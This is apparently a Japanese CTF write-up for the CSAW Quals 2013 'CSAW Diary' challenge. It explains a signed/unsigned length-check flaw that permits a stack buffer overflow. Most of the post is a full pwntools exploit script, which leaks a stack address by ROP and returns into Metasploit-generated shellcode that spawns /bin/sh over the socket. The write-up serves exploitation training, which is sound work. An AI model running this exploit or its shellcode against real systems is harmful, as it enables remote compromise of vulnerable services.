---
layout: post
redirect_from:
  - /blog/2016/01/22/csaw-quals-2013-csawdiary/
date: 2016-01-22T04:57:41+09:00
tags: [ "ctf", "writeup", "csaw-ctf", "arithmetic-overflow", "buffer-overflow", "shellcode", "return-oriented-programming" ]
---

# CSAW Quals CTF 2013: CSAW Diary

かなりの時間はかかったが大半は自力で解いた。

## [CSAW Diary](https://github.com/ctfs/write-ups-2013/tree/master/csaw-quals-2013/exploitation/csawdiary-300)

>   nc 128.238.66.217 34266  
>   [fil_chal]()

与えられるバイナリは`34266`番portを開くサーバ。
接続するとloginを要求されるが、これはバイナリ中に平文で置いてあるのでそれを渡す。
すると`Entry Info: `と入力を促される。まず入力長となる整数を入力し、内容の文字列を入力する。
単純なbuffer overflowはない。

``` sh
$ nc localhost 34266
     *************    $$$$$$$$$        AAAAAAA  *****                   *****
    *   *******  *    $ $$   $$        A     A   *   *                 *   * 
    *  *       ***     $ $   $$       A  A A  A   *   *               *   *  
    *  *                $ $          A  A___A  A   *   *             *   *   
    *  *                 $ $        A           A   *   *    ****   *   *
    *  *                  $ $      A     AAA     A   *   *   *  *  *   *
    *  *       ***         $ $     A    A   A    A    *   ***   ***   *
    *  ********  *   $$$$$$   $    A    A   A    A     *             * 
     *************   $$$$$$$$$$    AAAAAA   AAAAAA      ************* 
                Dairy

UserName: csaw2013
Password: S1mplePWD
Welcome!
http://youtu.be/KmtzQCSh6xk

Entry Info: 30
foo
Til next time
```

nx bitはない。

``` sh
$ checksec --file fil_chal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   fil_chal
```

脆弱性となるのは入力長の整数とその`signed`と`unsigned`を混同した比較である。
内部で`(unsigned)(n+1) <= 0x400`と比較されるので、ここに`-1`を渡すと`0 < 0x400`となりチェックを通過できる。このため`0xffffffff`文字まで書き込めることになり、stack上のbuffer overflowが可能となる。
あとは、stackのアドレスは再接続により変わらないため、簡単なropによりstackを読み出し、これから得られたアドレスを元にstack上のshellcodeにreturnすればよい。

本来のbufferの範囲にはasciiの範囲の文字しか入力できないようチェックがあるが、これは攻撃には影響しない。
アドレスの読み出しは不安定なのでsledと手での調整で適当にする。

ところでyoutubeへのurlは何だったのだろうか。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import time

context.log_level = 'debug'

##
## leak esp
##

p = remote('localhost', 34266)
p.recvuntil('UserName: ')
p.sendline('csaw2013')
p.recvuntil('Password: ')
p.sendline('S1mplePWD')
p.recvuntil('Entry Info: ')
p.sendline('-1')

# buf + 0x420 - 8 ebx
# buf + 0x420 - 4 edi
# buf + 0x420     ebp
# buf + 0x420 + 4 ret
# buf + 0x420 + 4 + 0x1c ebp

call_send = 0x08048d04
pop0_ret = 0x0804868f # rp -r 0 -f fil_chal --unique

payload = ''
payload += 'A' * 0x420 # buf[0x400], it must be filled with ascii
payload += p32(pop0_ret) * 5
payload += p32(call_send) # send(4, ebp, -1, 0)
payload += p32(4) # socket fd
p.sendline(payload)
s = p.recvall()

# find a stack-like addr
for i in range(len(s)-4):
    if s[i+3] == '\xff' and '\0' not in s[i:i+4]:
        stk = u32(s[i:i+4])
        break
stk -= 0x100 # magic offset, hand tweaked
log.success('got stack addr: ' + hex(stk))

##
## attack
##

p = remote('localhost', 34266)
p.recvuntil('UserName: ')
p.sendline('csaw2013')
p.recvuntil('Password: ')
p.sendline('S1mplePWD')
p.recvuntil('Entry Info: ')
p.sendline('-1')

# metasploit
# >   $ msfconsole
# >   msf payload(shell_bind_tcp) > use payload/linux/x86/exec
# >   msf payload(exec) > generate -o CMD='/bin/sh 0<&4 1>&4'
shellcode = \
    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" + \
    "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x12\x00\x00" + \
    "\x00\x2f\x62\x69\x6e\x2f\x73\x68\x20\x30\x3c\x26\x34\x20" + \
    "\x31\x3e\x26\x34\x00\x57\x53\x89\xe1\xcd\x80"

payload = ''
payload += 'A' * 0x420 # buf[0x400], it must be filled with ascii
payload += p32(stk)
payload += '\x90' * 0x100 # nop sled, if you make it longer, sigsegv will happen
payload += shellcode
p.sendline(payload)

time.sleep(0.1)
p.sendline('ls')
p.interactive()
```
